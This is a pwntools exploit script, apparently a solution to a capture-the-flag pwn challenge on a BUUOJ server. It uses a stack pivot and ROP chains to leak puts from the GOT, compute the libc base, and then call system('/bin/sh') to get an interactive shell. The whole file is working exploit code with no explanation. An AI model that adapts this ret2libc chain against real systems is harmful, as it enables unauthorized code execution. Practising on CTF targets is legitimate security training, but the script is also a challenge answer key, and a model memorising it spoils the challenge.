#!/usr/bin/env python3

from pwn import *
from LibcSearcher import *

context(os = 'linux',arch = 'amd64',log_level = 'debug')

file_name = './pwn'
lib_name = './libc.so.6'
debug = 1
if debug:
    p = process(file_name)
    context.terminal = ['tmux','splitw','-h']
    gdb.attach(p)
else:
    p = remote('node5.buuoj.cn', 29571)
elf = ELF(file_name)
rop = ROP(file_name)
libc = ELF(lib_name)

p.recvuntil(b'your name:')
p.send(b'aaaaaaaa')

p.recvuntil(b'I have a small gift for you: ')
buf = int(p.recv(14), 16)
success("buf_addr: " + hex(buf))

main_plt = 0x4011FB
leave_ret = 0x4012AA
ret = 0x4012AB
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rbp_ret = 0x4012CD

offset = 88
payload = b''
payload += b'a' * 8
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_plt)
payload += b'A' * (offset - len(payload) - 8)
payload += p64(buf + 8)
payload += p64(leave_ret)
p.recvuntil(b'more infomation plz:')
p.send(payload)

p.recvuntil(b"maybe I'll see you soon!\n")
puts_addr = u64(p.recvuntil(b'\x7f')[:6].ljust(8, b'\x00'))
libc.address = puts_addr - libc.sym['puts']
success("puts_addr: " + hex(puts_addr))
success("libc_address: " + hex(libc.address))
syscall = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))

p.recvuntil(b'your name:')
p.send(b'bbbbbbbb')

p.recvuntil(b'I have a small gift for you: ')
buf = int(p.recv(14), 16)
success("buf_addr: " + hex(buf))


payload = b''
payload = b'b' * 8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(syscall)
payload = payload.ljust(offset-8, b'B')
payload += p64(buf + 8)
payload += p64(leave_ret)
p.recvuntil(b'more infomation plz:')
p.send(payload)

p.interactive()

